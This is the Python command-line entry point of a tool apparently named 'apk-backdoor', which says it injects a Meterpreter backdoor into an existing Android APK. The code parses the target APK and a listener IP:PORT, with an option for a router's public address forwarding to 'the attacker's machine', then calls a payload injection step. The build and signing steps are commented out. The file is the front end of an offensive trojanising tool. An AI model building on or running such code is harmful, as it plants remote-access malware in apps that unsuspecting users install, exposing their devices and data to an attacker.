import argparse
import logging
import re
from collections import namedtuple

from colorama import Fore, Style

from . import __version__
from . import utilities
from .apk import Apk
from .payload import Payload
from .utilities import phase


def ip_port_value(string):
    ip_pattern = re.compile(
        r"^((?:(?:25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:(25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9]))):(\d+?)$")
    match = ip_pattern.match(string)
    if not match:
        raise argparse.ArgumentTypeError(f"The value '{string}' is not in the form IP:PORT")

    HostAddress = namedtuple('HostAddress', ['ip', 'port'])
    return HostAddress(ip=match[1], port=match[3])


def setup_args():
    parser = argparse.ArgumentParser(
        description='Inject a meterpreter backdoor in an existing APK',
        prog='apk-backdoor',
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version=f"%(prog)s - v{__version__}"
    )

    parser.add_argument(
        'apk',
        metavar='APK',
        help='The APK where the backdoor will be injected',
    )

    parser.add_argument(
        '--host', '-H',
        dest='host',
        default=None,
        metavar='HOST',
        help='The host (in the form IP:PORT) to which the payload will send data',
        type=ip_port_value
    )

    parser.add_argument(
        '--public_host', '-p',
        dest='public_host',
        default=None,
        metavar='PUBLIC_HOST',
        help='The host (in the form IP:PORT) to which the payload will send data.'
             ' Use this if HOST is in a private network: REAL_HOST will be the '
             "router's public IP (and the port that the router will forward to "
             "the attacker's machine)",
        type=ip_port_value
    )

    parser.add_argument(
        '-V', '--verbose',
        dest='verbosity',
        choices=['CRITICAL', 'ERROR', 'WARN', 'INFO', 'DEBUG'],
        default='CRITICAL',
        type=str.upper,
        help='Verbosity level (between 1 and 5 occurrences with '
             'more leading to a more verbose logging). '
             'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'
    )
    log_levels = {
        'CRITICAL': logging.CRITICAL,
        'ERROR': logging.ERROR,
        'WARN': logging.WARN,
        'INFO': logging.INFO,
        'DEBUG': logging.DEBUG,
    }

    args = parser.parse_args()
    args.verbosity = log_levels[args.verbosity]
    return args


def main():
    args = setup_args()
    logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log', filemode='w')

    utilities.clear_screen()
    print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)

    while args.host is None:
        host = input(f'{Fore.YELLOW}Set the listener address: ')
        print(Style.RESET_ALL, end='', flush=True)
        try:
            args.host = ip_port_value(host)
        except argparse.ArgumentTypeError as e:
            print(Fore.RED + str(e) + Style.RESET_ALL)
            args.host = None
    print(('-' * 30).center(120))

    apk = Apk(args.apk)
    payload = Payload(apk, args.host, args.public_host)

    print('[ ==== PAYLOAD INJECTION ==== ]'.center(120))
    payload.inject()
    payload.delete()

    print('[ ==== TARGET FINALIZATION ==== ]'.center(120))

    # apk.build()

    # apk.sign()

    # @phase("Removing target's APK decompilation's results")
    # def remove_decompiled():
    #     apk.remove_decompiled()

    # remove_decompiled()

    print()
